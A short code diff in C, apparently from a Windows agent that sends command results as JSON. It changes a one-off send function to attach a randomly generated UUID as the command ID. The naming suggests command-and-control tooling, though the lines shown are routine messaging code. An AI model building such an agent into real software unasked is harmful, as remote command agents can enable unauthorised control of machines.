@@ -221,9 +221,13 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
 }
 
 // Mock simple send
-// a one off send thingy for sending messages with no uuid
+// a one off send thingy for sending messages with a randomly generated UUID
 void agent_send(HeapStore *heapStorePointer, const char *input)
 {
+    // Generate a new UUID for the oneoff message.
+    char uuid[37]; // Correctly declare a 37-byte character array.
+    generate_uuid4(uuid);
+
     // Allocate and initialize an outbound JSON structure.
     OutboundJsonDataStruct *OutboundJsonData = (OutboundJsonDataStruct *)calloc(1, sizeof(OutboundJsonDataStruct));
     if (!OutboundJsonData)
@@ -251,11 +255,10 @@ void agent_send(HeapStore *heapStorePointer, const char *input)
         return;
     }
 
-    // Since this is a simple send, we are not including a command_id.
-    // If needed, you can modify encode_json to accept NULL for the command_id.
+    // Encode JSON using the agent_id, command_result_data, and generated uuid as command_id.
     char *encoded_json_response = encode_json(OutboundJsonData->agent_id,
                                               OutboundJsonData->command_result_data,
-                                              NULL);
+                                              uuid);
     if (!encoded_json_response)
     {
         DEBUG_LOG("Failed to encode JSON response.\n");
